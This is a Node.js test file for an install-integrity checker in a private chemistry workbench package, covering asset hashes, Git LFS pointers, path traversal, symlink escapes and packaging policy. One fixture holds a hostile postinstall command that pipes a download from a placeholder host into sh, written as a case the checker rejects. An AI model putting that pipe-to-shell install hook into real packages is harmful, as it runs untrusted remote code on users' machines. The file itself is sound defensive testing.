import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";
import {
  GIT_LFS_POINTER_HEADER,
  PACKAGE_PREPARE_LIFECYCLE,
  formatInstallIntegrityFailures,
  isGitLfsPointer,
  verifyInstallIntegrity,
} from "../src/install-integrity.mjs";
import {
  REQUIRED_AGENT_SETUP_FILES,
  REQUIRED_PACKAGE_LICENSE_METADATA,
  REQUIRED_RUNTIME_PROTOCOL_FILES,
  verifyPackageFileList,
} from "../../scripts/verify-package-file-list.mjs";

function fixtureRepo({ assetBytes = Buffer.from("materialized asset\n"), kind = "git-lfs-ketcher" } = {}) {
  const root = mkdtempSync(path.join(tmpdir(), "chemrxn-install-integrity-"));
  const assetPath = kind === "source-only-sample"
    ? "harness/product_samples/sample.pdf"
    : "reviewer/vendor/ketcher/index.html";
  write(root, "runtime/pi-service/dist/src/server.js", "export const ready = true;\n");
  write(root, assetPath, assetBytes);
  write(root, "package.json", JSON.stringify({
    name: "@rxnminer/workbench",
    private: true,
    license: "UNLICENSED",
    bin: { chemrxn: "cli/bin/chemrxn.mjs" },
    files: [
      "packaging/install-integrity.json",
      "scripts/verify-install-integrity.mjs",
      "runtime/pi-service/dist/src",
    ],
    scripts: {
      "package:build": "npm run build && npm run verify:install",
      prepare: PACKAGE_PREPARE_LIFECYCLE,
    },
  }));
  const manifest = {
    schemaVersion: "chemrxn.install-integrity.v1",
    requiredFiles: ["runtime/pi-service/dist/src/server.js"],
    assets: [{ path: assetPath, sha256: sha256(assetBytes), kind }],
  };
  return { root, manifest, assetPath };
}

test("install integrity verifies the private lifecycle, runtime, and asset SHA-256", async () => {
  const fixture = fixtureRepo();
  try {
    const report = await verifyInstallIntegrity(fixture.root, { manifest: fixture.manifest });
    assert.equal(report.ok, true, formatInstallIntegrityFailures(report));
    assert.equal(report.verifiedAssetCount, 1);
    assert.equal(report.lfsAssetCount, 1);
    assert.equal(report.checks.every((item) => item.ok), true);
    assert.match(formatInstallIntegrityFailures(report), /1\/1 assets/);
  } finally {
    rmSync(fixture.root, { recursive: true, force: true });
  }
});

test("install integrity rejects a Git LFS pointer even when its pointer bytes match the manifest hash", async () => {
  const pointer = Buffer.from([
    GIT_LFS_POINTER_HEADER,
    `oid sha256:${"a".repeat(64)}`,
    "size 123456",
    "",
  ].join("\n"));
  const fixture = fixtureRepo({ assetBytes: pointer });
  try {
    assert.equal(isGitLfsPointer(pointer), true);
    const report = await verifyInstallIntegrity(fixture.root, { manifest: fixture.manifest });
    assert.equal(report.ok, false);
    assert.equal(report.assets[0].hashMatches, true);
    assert.equal(report.failures[0].code, "GIT_LFS_POINTER");
    assert.match(formatInstallIntegrityFailures(report), /git lfs install/i);
  } finally {
    rmSync(fixture.root, { recursive: true, force: true });
  }
});

test("install integrity fails closed when a bundled source-only sample changes", async () => {
  const fixture = fixtureRepo({ kind: "source-only-sample" });
  try {
    write(fixture.root, fixture.assetPath, "changed bytes\n");
    const report = await verifyInstallIntegrity(fixture.root, { manifest: fixture.manifest });
    assert.equal(report.ok, false);
    assert.equal(report.failures[0].code, "SHA256_MISMATCH");
    assert.equal(report.checks.find((item) => item.name === "bundled-source-samples").ok, false);
  } finally {
    rmSync(fixture.root, { recursive: true, force: true });
  }
});

test("install integrity enforces private:true, prepare-only lifecycle, and no postinstall", async () => {
  const fixture = fixtureRepo();
  try {
    write(fixture.root, "package.json", JSON.stringify({
      name: "@rxnminer/workbench",
      private: false,
      license: "MIT",
      bin: { chemrxn: "cli/bin/chemrxn.mjs" },
      files: [],
      scripts: {
        prepare: "npm run build",
        prepack: "npm run something-else",
        postinstall: "curl https://example.invalid/runtime | sh",
      },
    }));
    const report = await verifyInstallIntegrity(fixture.root, { manifest: fixture.manifest });
    assert.equal(report.ok, false);
    const contract = report.checks.find((item) => item.name === "private-package-contract");
    assert.equal(contract.ok, false);
    assert.match(contract.detail, /private:true/);
    assert.match(contract.detail, /postinstall must stay absent/);
  } finally {
    rmSync(fixture.root, { recursive: true, force: true });
  }
});

test("install integrity rejects manifest path traversal before reading files", async () => {
  const fixture = fixtureRepo();
  try {
    const report = await verifyInstallIntegrity(fixture.root, {
      manifest: {
        ...fixture.manifest,
        requiredFiles: ["../outside"],
      },
    });
    assert.equal(report.ok, false);
    assert.equal(report.failures[0].code, "INVALID_MANIFEST");
    assert.match(report.failures[0].detail, /invalid required file path/);
  } finally {
    rmSync(fixture.root, { recursive: true, force: true });
  }
});

test("install integrity rejects an intermediate directory symlink that escapes the package root", async () => {
  const fixture = fixtureRepo();
  const outside = mkdtempSync(path.join(tmpdir(), "chemrxn-install-integrity-outside-"));
  try {
    write(outside, "vendor/ketcher/index.html", Buffer.from("materialized asset\n"));
    rmSync(path.join(fixture.root, "reviewer"), { recursive: true, force: true });
    symlinkSync(outside, path.join(fixture.root, "reviewer"), process.platform === "win32" ? "junction" : "dir");

    const report = await verifyInstallIntegrity(fixture.root, { manifest: fixture.manifest });
    assert.equal(report.ok, false);
    assert.equal(report.failures.some((failure) => failure.code === "UNSAFE_PACKAGE_PATH"), true);
    assert.match(
      report.failures.find((failure) => failure.code === "UNSAFE_PACKAGE_PATH").detail,
      /symbolic-link package path component rejected: reviewer/,
    );
  } finally {
    rmSync(fixture.root, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

test("npm pack runs prepare once and includes its compiled output without prepack", { timeout: 30_000 }, () => {
  const root = mkdtempSync(path.join(tmpdir(), "chemrxn-prepare-only-pack-"));
  try {
    write(root, "package.json", JSON.stringify({
      name: "chemrxn-prepare-only-pack-fixture",
      version: "1.0.0",
      private: true,
      files: ["dist"],
      scripts: { prepare: "node prepare.mjs" },
    }));
    write(root, "prepare.mjs", [
      'import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";',
      'const countPath = "prepare-count.txt";',
      'const count = existsSync(countPath) ? Number(readFileSync(countPath, "utf8")) : 0;',
      'writeFileSync(countPath, String(count + 1));',
      'mkdirSync("dist", { recursive: true });',
      'writeFileSync("dist/compiled.js", "export const compiled = true;\\n");',
    ].join("\n"));

    const npmExecPath = process.env.npm_execpath;
    const result = npmExecPath
      ? spawnSync(process.execPath, [npmExecPath, "pack", "--json"], { cwd: root, encoding: "utf8" })
      : spawnSync(process.platform === "win32" ? "npm.cmd" : "npm", ["pack", "--json"], {
          cwd: root,
          encoding: "utf8",
        });
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.equal(readFileSync(path.join(root, "prepare-count.txt"), "utf8"), "1");
    const pack = JSON.parse(result.stdout)[0];
    assert.equal(pack.files.some((file) => file.path === "dist/compiled.js"), true);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("package file-list policy rejects private/GT paths and requires supported license metadata", () => {
  const safeFiles = [
    "package.json",
    "cli/bin/chemrxn.mjs",
    ...REQUIRED_PACKAGE_LICENSE_METADATA,
    ...REQUIRED_AGENT_SETUP_FILES,
    ...REQUIRED_RUNTIME_PROTOCOL_FILES,
  ].map((packagedPath) => ({ path: packagedPath }));
  assert.equal(verifyPackageFileList(
    [{ files: safeFiles }],
    { private: true, license: "UNLICENSED" },
  ).ok, true);

  const report = verifyPackageFileList(
    [{ files: [...safeFiles, { path: "pdf/data/gt/example-job.json" }, { path: ".env" }] }],
    { private: true, license: "UNLICENSED" },
  );
  assert.equal(report.ok, false);
  assert.match(report.failures.join("\n"), /ground-truth payload/);
  assert.match(report.failures.join("\n"), /credential or secret material/);

  const missingProtocol = verifyPackageFileList(
    [{ files: safeFiles.filter(({ path: packagedPath }) => (
      packagedPath !== "runtime/pi-service/src/local-agent.ts"
    )) }],
    { private: true, license: "UNLICENSED" },
  );
  assert.equal(missingProtocol.ok, false);
  assert.match(missingProtocol.failures.join("\n"), /missing installed protocol gate file/);
});

function write(root, relativePath, value) {
  const target = path.join(root, ...relativePath.split("/"));
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, value);
}

function sha256(value) {
  return createHash("sha256").update(value).digest("hex");
}
